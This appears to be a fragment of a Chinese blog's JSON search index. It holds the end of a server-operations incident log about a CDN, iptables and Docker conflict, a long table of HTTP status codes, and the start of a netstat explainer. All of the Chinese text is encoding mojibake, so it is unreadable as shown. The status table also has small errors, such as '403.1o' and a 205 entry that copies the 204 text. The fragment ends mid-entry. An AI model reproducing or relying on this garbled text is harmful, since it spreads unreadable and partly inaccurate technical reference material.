ä¸ºå½“æ—¶æˆ‘æ²¡æœ‰é€šè¿‡cdnç›´è¾¾æœåŠ¡å™¨çš„æ—¶å€™è®¿é—®éƒ½æ˜¯æ­£å¸¸çš„ï¼Œç„¶åé€šè¿‡cdnåï¼Œé¡µé¢å¤§å¤šæ•°è¯·æ±‚å°±éƒ½å‡ºç°äº†502ç­‰çŠ¶æ€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘è”ç³»äº†è¿è¥å•†ï¼Œä»–ä»¬è¯´å›æºé“¾æ¥è¢«æ–­å¼€äº†ï¼Œæ˜¯ä¸æ˜¯æœåŠ¡å™¨ä¸Šæœ‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œä»”ç»†çš„æƒ³äº†ä¸‹ï¼ŒæœåŠ¡å™¨ä¸Šé™¤äº†å¼€å¯äº†iptableså¤–ï¼Œå¹¶æ²¡æœ‰å…¶ä»–çš„å®‰å…¨è®¾ç½®ï¼Œæ­£æ²¡æœ‰å¤´ç»ªçš„æ—¶å€™ï¼Œçªç„¶æƒ³åˆ°dockeréœ€è¦ä¾èµ–iptablesè½¬å‘ï¼Œæ˜¯ä¸æ˜¯è¿™ä¸ªåŸå› å¯¼è‡´é˜²ç«å¢™åˆæœ‰é—®é¢˜äº†(å› ä¸ºä¹‹å‰æˆ‘è°ƒæ•´iptablesçš„æ—¶å€™ï¼Œå¯¼è‡´è¿‡dockerå®¹å™¨æ— æ³•è¿æ¥ç½‘ç»œğŸ˜¥)ï¼Œäºæ˜¯æˆ‘æŠŠé˜²ç«å¢™ä¸€å…³ï¼Œç„¶åcdnå›æºå°±æ­£å¸¸äº†ã€‚ åç»­çš„å¤„ç†ï¼Œæˆ‘å…³é—­äº†æœåŠ¡å™¨é˜²ç«å¢™è®¾ç½®ï¼Œé‡å¯äº†dockerï¼Œé‡å»ºäº†å®¹å™¨(é˜²æ­¢å®¹å™¨ç½‘ç»œå‡ºç°é—®é¢˜ï¼ŒåŒæ—¶è®©dockeré‡æ–°åˆ›å»ºè‡ªå·±çš„è§„åˆ™é“¾)ã€‚å¯¹å¤–çš„é˜²ç«å¢™é‡‡ç”¨äº‘é˜²ç«å¢™ç°åœ¨å…¬ç½‘æµå…¥æµé‡ã€‚ä¸Šé¢å…¶ä»–è®°å½•çš„æ•…éšœä¸­ï¼Œä¼°è®¡ä¹Ÿæœ‰è¿™ä¸ªåŸå› å¯¼è‡´çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆè°ƒå¥½äº†ã€‚(TODO:// ä¸€ä¸ªäººè¿ç»´å¥½éš¾ï¼Œæœ‰ç‚¹å•¥é—®é¢˜éƒ½ä¸çŸ¥é“è¯¥æ‰¾è°è®¨è®ºä¸‹ï¼Œå…¨é è‡ªå·±æ‘¸ç´¢) nginx: [emerg] location â€œâ€ cannot be inside the ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"æœåŠ¡å™¨è¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"HTTPå“åº”ç /http_code","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/","tags":["linux","http"],"title":"HTTPå“åº”ç ","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" HTTPå“åº”ç åˆ†ç±» https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status å¸¸è§çŠ¶æ€ç  ä¸€äº›å¸¸è§HTTPçŠ¶æ€ç ä¸ºï¼š 200 â€“ æœåŠ¡å™¨æˆåŠŸè¿”å›ç½‘é¡µ 404 â€“ è¯·æ±‚çš„ç½‘é¡µä¸å­˜åœ¨ 503 â€“ æœåŠ¡ä¸å¯ç”¨ å¸¸è§HTTPçŠ¶æ€ç å¤§å…¨ 1xxï¼ˆä¸´æ—¶å“åº”ï¼‰ è¡¨ç¤ºä¸´æ—¶å“åº”å¹¶éœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œçš„çŠ¶æ€ä»£ç ã€‚ httpçŠ¶æ€ç  è¯´æ˜ 100 ï¼ˆç»§ç»­ï¼‰ è¯·æ±‚è€…åº”å½“ç»§ç»­æå‡ºè¯·æ±‚ã€‚ æœåŠ¡å™¨è¿”å›æ­¤ä»£ç è¡¨ç¤ºå·²æ”¶åˆ°è¯·æ±‚çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œæ­£åœ¨ç­‰å¾…å…¶ä½™éƒ¨åˆ†ã€‚ 101 ï¼ˆåˆ‡æ¢åè®®ï¼‰ è¯·æ±‚è€…å·²è¦æ±‚æœåŠ¡å™¨åˆ‡æ¢åè®®ï¼ŒæœåŠ¡å™¨å·²ç¡®è®¤å¹¶å‡†å¤‡åˆ‡æ¢ã€‚ 102 å°†ç»§ç»­æ‰§è¡Œè¯·æ±‚ 2xx ï¼ˆæˆåŠŸï¼‰ è¡¨ç¤ºæˆåŠŸå¤„ç†äº†è¯·æ±‚çš„çŠ¶æ€ä»£ç ã€‚ httpçŠ¶æ€ç  è¯´æ˜ 200 ï¼ˆæˆåŠŸï¼‰ æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚ã€‚ é€šå¸¸ï¼Œè¿™è¡¨ç¤ºæœåŠ¡å™¨æä¾›äº†è¯·æ±‚çš„ç½‘é¡µã€‚ 201 ï¼ˆå·²åˆ›å»ºï¼‰ è¯·æ±‚æˆåŠŸå¹¶ä¸”æœåŠ¡å™¨åˆ›å»ºäº†æ–°çš„èµ„æºã€‚ 202 ï¼ˆå·²æ¥å—ï¼‰ æœåŠ¡å™¨å·²æ¥å—è¯·æ±‚ï¼Œä½†å°šæœªå¤„ç†ã€‚ 203 ï¼ˆéæˆæƒä¿¡æ¯ï¼‰ æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†è¿”å›çš„ä¿¡æ¯å¯èƒ½æ¥è‡ªå¦ä¸€æ¥æºã€‚ 204 ï¼ˆæ— å†…å®¹ï¼‰ æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚ 205 ï¼ˆé‡ç½®å†…å®¹ï¼‰ æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚ 206 ï¼ˆéƒ¨åˆ†å†…å®¹ï¼‰ æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ† GET è¯·æ±‚ã€‚ 207 è¯·æ±‚å·²æˆåŠŸå¤„ç†ï¼Œè¿”å›äº†å¤šä¸ªçŠ¶æ€çš„XMLæ¶ˆæ¯ 208 å“åº”å·²å‘é€ 226 å·²å®Œæˆå“åº” 3xx ï¼ˆé‡å®šå‘ï¼‰ è¡¨ç¤ºè¦å®Œæˆè¯·æ±‚ï¼Œéœ€è¦è¿›ä¸€æ­¥æ“ä½œã€‚ é€šå¸¸ï¼Œè¿™äº›çŠ¶æ€ä»£ç ç”¨æ¥é‡å®šå‘ã€‚ ä»£httpçŠ¶æ€ç ç  è¯´æ˜ 300 ï¼ˆå¤šç§é€‰æ‹©ï¼‰ é’ˆå¯¹è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯æ‰§è¡Œå¤šç§æ“ä½œã€‚ æœåŠ¡å™¨å¯æ ¹æ®è¯·æ±‚è€… (user agent) é€‰æ‹©ä¸€é¡¹æ“ä½œï¼Œæˆ–æä¾›æ“ä½œåˆ—è¡¨ä¾›è¯·æ±‚è€…é€‰æ‹©ã€‚ 301 ï¼ˆæ°¸ä¹…ç§»åŠ¨ï¼‰ è¯·æ±‚çš„ç½‘é¡µå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚ æœåŠ¡å™¨è¿”å›æ­¤å“åº”ï¼ˆå¯¹ GET æˆ– HEAD è¯·æ±‚çš„å“åº”ï¼‰æ—¶ï¼Œä¼šè‡ªåŠ¨å°†è¯·æ±‚è€…è½¬åˆ°æ–°ä½ç½®ã€‚ 302 ï¼ˆä¸´æ—¶ç§»åŠ¨ï¼‰ æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚è€…åº”ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚ã€‚ 303 ï¼ˆæŸ¥çœ‹å…¶ä»–ä½ç½®ï¼‰ è¯·æ±‚è€…åº”å½“å¯¹ä¸åŒçš„ä½ç½®ä½¿ç”¨å•ç‹¬çš„ GET è¯·æ±‚æ¥æ£€ç´¢å“åº”æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤ä»£ç ã€‚ 304 ï¼ˆæœªä¿®æ”¹ï¼‰ è‡ªä»ä¸Šæ¬¡è¯·æ±‚åï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ã€‚ æœåŠ¡å™¨è¿”å›æ­¤å“åº”æ—¶ï¼Œä¸ä¼šè¿”å›ç½‘é¡µå†…å®¹ã€‚ 305 ï¼ˆä½¿ç”¨ä»£ç†ï¼‰ è¯·æ±‚è€…åªèƒ½ä½¿ç”¨ä»£ç†è®¿é—®è¯·æ±‚çš„ç½‘é¡µã€‚ å¦‚æœæœåŠ¡å™¨è¿”å›æ­¤å“åº”ï¼Œè¿˜è¡¨ç¤ºè¯·æ±‚è€…åº”ä½¿ç”¨ä»£ç†ã€‚ 307 ï¼ˆä¸´æ—¶é‡å®šå‘ï¼‰ æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚è€…åº”ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚ã€‚ 308 ï¼ˆæ°¸ä¹…è½¬ç§»ï¼‰è¿™ä¸ªè¯·æ±‚å’Œä»¥åçš„è¯·æ±‚éƒ½åº”è¯¥è¢«å¦ä¸€ä¸ªURIåœ°å€é‡æ–°å‘é€ã€‚307ã€308å’Œ302ã€301æœ‰ç›¸åŒçš„è¡¨ç°ï¼Œä½†æ˜¯ä¸å…è®¸HTTPæ–¹æ³•æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚è¡¨å•åˆ°ä¸€ä¸ªæ°¸ä¹…è½¬ç§»çš„èµ„æºå°†ä¼šç»§ç»­é¡ºåˆ©åœ°æ‰§è¡Œã€‚ 4xxï¼ˆè¯·æ±‚é”™è¯¯ï¼‰ è¿™äº›çŠ¶æ€ä»£ç è¡¨ç¤ºè¯·æ±‚å¯èƒ½å‡ºé”™ï¼Œå¦¨ç¢äº†æœåŠ¡å™¨çš„å¤„ç†ã€‚ httpçŠ¶æ€ç  è¯´æ˜ 400 ï¼ˆé”™è¯¯è¯·æ±‚ï¼‰ æœåŠ¡å™¨ä¸ç†è§£è¯·æ±‚çš„è¯­æ³•ã€‚ 401 ï¼ˆæœªæˆæƒï¼‰ éœ€è¦èº«ä»½è®¤è¯éªŒè¯. å¯¹äºéœ€è¦ç™»å½•çš„ç½‘é¡µï¼ŒæœåŠ¡å™¨å¯èƒ½è¿”å›æ­¤å“åº”ã€‚ 401.1 æœªæˆæƒï¼šç™»å½•å¤±è´¥ 401.2 æœªæˆæƒï¼šæœåŠ¡å™¨é…ç½®é—®é¢˜å¯¼è‡´ç™»å½•å¤±è´¥ 401.3 ACL ç¦æ­¢è®¿é—®èµ„æº 401.4 æœªæˆæƒï¼šæˆæƒè¢«ç­›é€‰å™¨æ‹’ç» 401.5 æœªæˆæƒï¼šISAPI æˆ– CGI æˆæƒå¤±è´¥ 401.7 è®¿é—®è¢« Web æœåŠ¡å™¨ä¸Šçš„ URL æˆæƒç­–ç•¥æ‹’ç»ã€‚è¿™ä¸ªé”™è¯¯ä»£ç ä¸º IIS 6.0 æ‰€ä¸“ç”¨ 403 ï¼ˆç¦æ­¢ï¼‰ æœåŠ¡å™¨æ‹’ç»è¯·æ±‚ã€‚å¯¹ Internet æœåŠ¡ç®¡ç†å™¨ çš„è®¿é—®ä»…é™äºLocalhost 403.1 ç¦æ­¢è®¿é—®ï¼šç¦æ­¢å¯æ‰§è¡Œè®¿é—® 403.2 ç¦æ­¢è®¿é—®ï¼šç¦æ­¢è¯»è®¿é—® 403.3 ç¦æ­¢è®¿é—®ï¼šç¦æ­¢å†™è®¿é—® 403.4 ç¦æ­¢è®¿é—®ï¼šè¦æ±‚ SSL 403.5 ç¦æ­¢è®¿é—®ï¼šè¦æ±‚ SSL 128 403.6 ç¦æ­¢è®¿é—®ï¼šIP åœ°å€è¢«æ‹’ç» 403.7 ç¦æ­¢è®¿é—®ï¼šè¦æ±‚å®¢æˆ·è¯ä¹¦ 403.8 ç¦æ­¢è®¿é—®ï¼šç¦æ­¢ç«™ç‚¹è®¿é—® 403.9 ç¦æ­¢è®¿é—®ï¼šè¿æ¥çš„ç”¨æˆ·è¿‡å¤š 403.1o ç¦æ­¢è®¿é—®ï¼šé…ç½®æ— æ•ˆ 403.11 ç¦æ­¢è®¿é—®ï¼šå¯†ç æ›´æ”¹ 403.12 ç¦æ­¢è®¿é—®ï¼šæ˜ å°„å™¨æ‹’ç»è®¿é—® 403.13 ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦å·²è¢«åŠé”€ 403.14 ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è®¿é—®è®¸å¯è¿‡å¤š 403.15 ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦ä¸å¯ä¿¡æˆ–è€…æ— æ•ˆ 403.16 ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦å·²ç»åˆ°æœŸæˆ–è€…å°šæœªç”Ÿæ•ˆ HTTP 404.1 - 403.17 å®¢æˆ·ç«¯è¯ä¹¦å·²è¿‡æœŸæˆ–å°šæœªç”Ÿæ•ˆã€‚ 403.18 åœ¨å½“å‰çš„åº”ç”¨ç¨‹åºæ± ä¸­ä¸èƒ½æ‰§è¡Œæ‰€è¯·æ±‚çš„ URLã€‚è¿™ä¸ªé”™è¯¯ä»£ç ä¸º IIS 6.0 æ‰€ä¸“ç”¨ã€‚ 403.19 ä¸èƒ½ä¸ºè¿™ä¸ªåº”ç”¨ç¨‹åºæ± ä¸­çš„å®¢æˆ·ç«¯æ‰§è¡Œ CGIã€‚è¿™ä¸ªé”™è¯¯ä»£ç ä¸º IIS 6.0 æ‰€ä¸“ç”¨ã€‚ 404 ï¼ˆæœªæ‰¾åˆ°ï¼‰ æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„ç½‘é¡µã€‚ 404.1 æ— æ³•åœ¨æ‰€è¯·æ±‚çš„ç«¯å£ä¸Šè®¿é—® Web ç«™ç‚¹ã€‚ 404.2 Web æœåŠ¡æ‰©å±•é”å®šç­–ç•¥é˜»æ­¢æœ¬è¯·æ±‚ã€‚ 404.3 MIME æ˜ å°„ç­–ç•¥é˜»æ­¢æœ¬è¯·æ±‚ã€‚ 405 ï¼ˆæ–¹æ³•ç¦ç”¨ï¼‰ ç¦ç”¨è¯·æ±‚ä¸­æŒ‡å®šçš„æ–¹æ³•ã€‚ 406 ï¼ˆä¸æ¥å—ï¼‰ æ— æ³•ä½¿ç”¨è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å“åº”è¯·æ±‚çš„ç½‘é¡µã€‚ 407 ï¼ˆéœ€è¦ä»£ç†æˆæƒï¼‰ æ­¤çŠ¶æ€ä»£ç ä¸ 401ï¼ˆæœªæˆæƒï¼‰ç±»ä¼¼ï¼Œä½†æŒ‡å®šè¯·æ±‚è€…åº”å½“æˆæƒä½¿ç”¨ä»£ç†ã€‚ 408 ï¼ˆè¯·æ±‚è¶…æ—¶ï¼‰ æœåŠ¡å™¨ç­‰å€™è¯·æ±‚æ—¶å‘ç”Ÿè¶…æ—¶ã€‚ 409 ï¼ˆå†²çªï¼‰ æœåŠ¡å™¨åœ¨å®Œæˆè¯·æ±‚æ—¶å‘ç”Ÿå†²çªã€‚ æœåŠ¡å™¨å¿…é¡»åœ¨å“åº”ä¸­åŒ…å«æœ‰å…³å†²çªçš„ä¿¡æ¯ã€‚ 410 ï¼ˆå·²åˆ é™¤ï¼‰ å¦‚æœè¯·æ±‚çš„èµ„æºå·²æ°¸ä¹…åˆ é™¤ï¼ŒæœåŠ¡å™¨å°±ä¼šè¿”å›æ­¤å“åº”ã€‚ 411 ï¼ˆéœ€è¦æœ‰æ•ˆé•¿åº¦ï¼‰ æœåŠ¡å™¨ä¸æ¥å—ä¸å«æœ‰æ•ˆå†…å®¹é•¿åº¦æ ‡å¤´å­—æ®µçš„è¯·æ±‚ã€‚ 412 ï¼ˆæœªæ»¡è¶³å‰ææ¡ä»¶ï¼‰ æœåŠ¡å™¨æœªæ»¡è¶³è¯·æ±‚è€…åœ¨è¯·æ±‚ä¸­è®¾ç½®çš„å…¶ä¸­ä¸€ä¸ªå‰ææ¡ä»¶ã€‚ 413 ï¼ˆè¯·æ±‚å®ä½“è¿‡å¤§ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ï¼Œå› ä¸ºè¯·æ±‚å®ä½“è¿‡å¤§ï¼Œè¶…å‡ºæœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›ã€‚ 414 ï¼ˆè¯·æ±‚çš„ URI è¿‡é•¿ï¼‰ è¯·æ±‚çš„ URIï¼ˆé€šå¸¸ä¸ºç½‘å€ï¼‰è¿‡é•¿ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ã€‚ 415 ï¼ˆä¸æ”¯æŒçš„åª’ä½“ç±»å‹ï¼‰ è¯·æ±‚çš„æ ¼å¼ä¸å—è¯·æ±‚é¡µé¢çš„æ”¯æŒã€‚ 416 ï¼ˆè¯·æ±‚èŒƒå›´ä¸ç¬¦åˆè¦æ±‚ï¼‰ å¦‚æœé¡µé¢æ— æ³•æä¾›è¯·æ±‚çš„èŒƒå›´ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å›æ­¤çŠ¶æ€ä»£ç ã€‚ 417 ï¼ˆæœªæ»¡è¶³æœŸæœ›å€¼ï¼‰ æœåŠ¡å™¨æœªæ»¡è¶³â€æœŸæœ›â€è¯·æ±‚æ ‡å¤´å­—æ®µçš„è¦æ±‚ã€‚ 418 ï¼ˆæˆ‘æ˜¯ä¸€ä¸ªèŒ¶å£¶ï¼‰è¿™ä¸ªä»£ç æ˜¯åœ¨1998å¹´ä½œä¸ºä¼ ç»Ÿçš„IETF April Foolsâ€˜ jokesè¢«å®šä¹‰çš„åœ¨RFC2324ï¼Œè¶…æ–‡æœ¬å’–å•¡ç½æ§åˆ¶åè®®ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¢«å®é™…çš„HTTPæœåŠ¡å™¨å®ç°ã€‚RFCæŒ‡å®šäº†è¿™ä¸ªä»£ç åº”è¯¥æ˜¯ç”±èŒ¶ç½è¿”å›ç»™é€Ÿæº¶å’–å•¡ã€‚ 419 ï¼ˆè®¤è¯è¶…æ—¶ï¼‰å¹¶ä¸æ˜¯HTTPæ ‡æ³¨çš„ä¸€éƒ¨åˆ†ï¼Œ419è®¤è¯è¶…æ—¶è¡¨ç¤ºä»¥å‰çš„æœ‰æ•ˆè¯æ˜å·²ç»å¤±æ•ˆäº†ã€‚åŒæ—¶ä¹Ÿè¢«ç”¨äº401æœªè®¤è¯çš„æ›¿ä»£é€‰æ‹©ä¸ºäº†ä»å…¶å®ƒè¢«æ‹’ç»è®¿é—®çš„å·²è®¤è¯å®¢æˆ·ç«¯ä¸­æŒ‡å®šæœåŠ¡å™¨çš„èµ„æºã€‚ 420 ï¼ˆæ–¹æ³•å¤±æ•ˆï¼‰ä¸æ˜¯HTTPçš„æ ‡å‡†ï¼Œä½†æ˜¯è¢«Springå®šä¹‰åœ¨HTTPçŠ¶æ€ç±»ä¸­å½“æ–¹æ³•å¤±æ—¶ä½¿ç”¨ã€‚è¿™ä¸ªçŠ¶æ€ç å·²ç»ä¸æ¨èåœ¨Springä¸­ä½¿ç”¨ã€‚ 420 ï¼ˆæé«˜ä½ çš„è€å¿ƒï¼‰ä¹Ÿä¸æ˜¯HTTPæ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¢«ç‰ˆæœ¬1çš„Twitteræœç´¢å’Œè¶‹åŠ¿APiè¿”å›å½“å®¢æˆ·ç«¯çš„é€Ÿç‡è¢«é™åˆ¶çš„æ—¶å€™ã€‚å…¶å®ƒçš„æœåŠ¡æä¾›å•†å¯èƒ½ä¼šä½¿ç”¨429å¤ªå¤šçš„è¯·æ±‚å“åº”ç æ¥ä»£æ›¿ã€‚ 421 ä»å½“å‰å®¢æˆ·ç«¯æ‰€åœ¨çš„IPåœ°å€åˆ°æœåŠ¡å™¨çš„è¿æ¥æ•°è¶…è¿‡äº†æœåŠ¡å™¨è®¸å¯çš„æœ€å¤§èŒƒå›´ã€‚é€šå¸¸ï¼Œè¿™é‡Œçš„IPåœ°å€æŒ‡çš„æ˜¯ä»æœåŠ¡å™¨ä¸Šçœ‹åˆ°çš„å®¢æˆ·ç«¯åœ°å€ï¼ˆæ¯”å¦‚ç”¨æˆ·çš„ç½‘å…³æˆ–è€…ä»£ç†æœåŠ¡å™¨åœ°å€ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿æ¥æ•°çš„è®¡ç®—å¯èƒ½æ¶‰åŠåˆ°ä¸æ­¢ä¸€ä¸ªç»ˆç«¯ç”¨æˆ·ã€‚ 422 è¯·æ±‚æ ¼å¼æ­£ç¡®ï¼Œä½†æ˜¯ç”±äºå«æœ‰è¯­ä¹‰é”™è¯¯ï¼Œæ— æ³•å“åº”ã€‚ï¼ˆRFC 4918 WebDAVï¼‰423 Lockedå½“å‰èµ„æºè¢«é”å®šã€‚ï¼ˆRFC 4918 WebDAVï¼‰ 424 ç”±äºä¹‹å‰çš„æŸä¸ªè¯·æ±‚å‘ç”Ÿçš„é”™è¯¯ï¼Œå¯¼è‡´å½“å‰è¯·æ±‚å¤±è´¥ï¼Œä¾‹å¦‚ PROPPATCHã€‚ï¼ˆRFC 4918 WebDAVï¼‰ 425 åœ¨WebDav Advanced Collections è‰æ¡ˆä¸­å®šä¹‰ï¼Œä½†æ˜¯æœªå‡ºç°åœ¨ã€ŠWebDAV é¡ºåºé›†åè®®ã€‹ï¼ˆRFC 3658ï¼‰ä¸­ã€‚ 426 å®¢æˆ·ç«¯åº”å½“åˆ‡æ¢åˆ°TLS/1.0ã€‚ï¼ˆRFC 2817ï¼‰ 428 (éœ€è¦å‰ç½®æ¡ä»¶)åŸå§‹æœåŠ¡å™¨éœ€è¦æœ‰æ¡ä»¶çš„è¯·æ±‚ã€‚å½“å®¢æˆ·ç«¯GETä¸€ä¸ªèµ„æºçš„çŠ¶æ€çš„æ—¶å€™ï¼ŒåŒæ—¶åˆPUTå›ç»™æœåŠ¡å™¨ï¼Œä¸æ­¤åŒæ—¶ç¬¬ä¸‰æ–¹ä¿®æ”¹çŠ¶æ€åˆ°æœåŠ¡å™¨ä¸Šçš„æ—¶å€™ï¼Œä¸ºäº†é¿å…ä¸¢å¤±æ›´æ–°çš„é—®é¢˜å‘ç”Ÿå°†ä¼šå¯¼è‡´å†²çªã€‚ 429 ï¼ˆè¿‡å¤šè¯·æ±‚ï¼‰ç”¨æˆ·å·²ç»å‘é€äº†å¤ªå¤šçš„è¯·æ±‚åœ¨æŒ‡å®šçš„æ—¶é—´é‡Œã€‚ç”¨äºé™åˆ¶é€Ÿç‡ã€‚ 431 ï¼ˆè¯·æ±‚å¤´éƒ¨å­—æ®µå¤ªå¤§ï¼‰æœåŠ¡å™¨ç”±äºä¸€ä¸ªå•ç‹¬çš„è¯·æ±‚å¤´éƒ¨å­—æ®µæˆ–è€…æ˜¯å…¨éƒ¨çš„å­—æ®µå¤ªå¤§è€Œä¸æ„¿æ„å¤„ç†è¯·æ±‚ã€‚ 440 ï¼ˆç™»é™†è¶…æ—¶ï¼ˆå¾®è½¯ï¼‰ï¼‰ä¸€ä¸ªå¾®è½¯çš„æ‰©å±•ï¼Œæ„å‘³ç€ä½ çš„ä¼šè¯å·²ç»è¶…æ—¶ã€‚ 444 ï¼ˆæ— å“åº”ï¼‰è¢«ä½¿ç”¨åœ¨Nginxçš„æ—¥å¿—ä¸­è¡¨æ˜æœåŠ¡å™¨æ²¡æœ‰è¿”å›ä¿¡æ¯ç»™å®¢æˆ·ç«¯å¹¶ä¸”å…³é—­äº†è¿æ¥ï¼ˆåœ¨å¨æ…‘æ¶æ„è½¯ä»¶çš„æ—¶å€™æ¯”è¾ƒæœ‰ç”¨ï¼‰ã€‚ 449 ï¼ˆé‡è¯•ï¼ˆå¾®è½¯ï¼‰ï¼‰ä¸€ä¸ªå¾®è½¯çš„æ‰©å±•ã€‚è¯·æ±‚åº”è¯¥åœ¨æ‰§è¡Œé€‚å½“çš„åŠ¨ä½œä¹‹åè¢«é‡è¯•ã€‚ 450 ï¼ˆè¢«Windowså®¶é•¿æ§åˆ¶é˜»å¡ï¼ˆå¾®è½¯ï¼‰ï¼‰ä¸€ä¸ªå¾®è½¯çš„æ‰©å±•ã€‚è¿™ä¸ªé”™è¯¯æ˜¯å½“Windowså®¶é•¿æ§åˆ¶æ‰“å¼€å¹¶ä¸”é˜»å¡æŒ‡å®šç½‘é¡µçš„è®¿é—®çš„æ—¶å€™è¢«æŒ‡å®šã€‚ 451 ï¼ˆç”±äºæ³•å¾‹åŸå› è€Œæ— æ•ˆï¼ˆå› ç‰¹ç½‘è‰ç¨¿ï¼‰ï¼‰è¢«å®šä¹‰åœ¨å› ç‰¹ç½‘è‰ç¨¿â€œä¸€ä¸ªæ–°çš„HTTPçŠ¶æ€ç ç”¨äºæ³•å¾‹é™åˆ¶çš„èµ„æºâ€ã€‚è¢«ç”¨äºå½“èµ„æºçš„è®¿é—®ç”±äºæ³•å¾‹åŸå› è¢«ç¦æ­¢çš„æ—¶å€™ã€‚ä¾‹å¦‚æ£€æŸ¥åˆ¶åº¦æˆ–è€…æ˜¯æ”¿åºœå¼ºåˆ¶è¦æ±‚ç¦æ­¢è®¿é—®ã€‚ä¸€ä¸ªä¾‹å­æ˜¯1953å¹´dystopiançš„å°è¯´Fahrenheit 451å°±æ˜¯ä¸€ä¸ªéæ³•çš„èµ„æºã€‚ 451 ï¼ˆé‡å®šå‘ï¼ˆå¾®è½¯ï¼‰ï¼‰è¢«ç”¨åœ¨Exchange ActiveSyncä¸­å¦‚æœä¸€ä¸ªæ›´æœ‰æ•ˆçš„æœåŠ¡å™¨èƒ½å¤Ÿè¢«ä½¿ç”¨æˆ–è€…æ˜¯æœåŠ¡å™¨ä¸èƒ½è®¿é—®ç”¨æˆ·çš„é‚®ç®±ã€‚å®¢æˆ·ç«¯ä¼šå‡å®šé‡æ–°æ‰§è¡ŒHTTPè‡ªåŠ¨å‘ç°åè®®å»å¯»æ‰¾æ›´é€‚åˆçš„æœåŠ¡å™¨ã€‚ 494 ï¼ˆè¯·æ±‚å¤´å¤ªå¤§ï¼ˆNginxï¼‰ï¼‰Nginxå†…ç½®ä»£ç å’Œ431ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯è¢«æ›´æ—©åœ°å¼•å…¥åœ¨ç‰ˆæœ¬0.9.4ï¼ˆåœ¨2011å¹´1æœˆ21æ—¥ï¼‰ã€‚ 495 ï¼ˆè¯ä¹¦é”™è¯¯ï¼ˆNginxï¼‰ï¼‰Nginxå†…ç½®çš„ä»£ç ï¼Œå½“ä½¿ç”¨SSLå®¢æˆ·ç«¯è¯ä¹¦çš„æ—¶å€™é”™è¯¯ä¼šå‡ºç°ä¸ºäº†åœ¨æ—¥å¿—é”™è¯¯ä¸­åŒºåˆ†å®ƒå’Œ4XXå’Œä¸€ä¸ªé”™è¯¯é¡µ","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/:0:0","tags":["linux","http"],"title":"HTTPå“åº”ç ","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Netstatå‘½ä»¤/TCPé“¾è·¯çŠ¶æ€","date":"2022-07-05","objectID":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/","tags":["linux","netstat","tcp"],"title":"Netstatå‘½ä»¤","uri":"/posts/linux/netstat%E5%91%BD%E4%BB%A4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"netstat å‘½ä»¤ netstatåˆ—å«ä¹‰ï¼š Proto: åè®®åï¼ˆtcpåè®®æˆ–è€…udpåè®®) recv-Q: ç½‘ç»œæ¥æ”¶é˜Ÿåˆ— 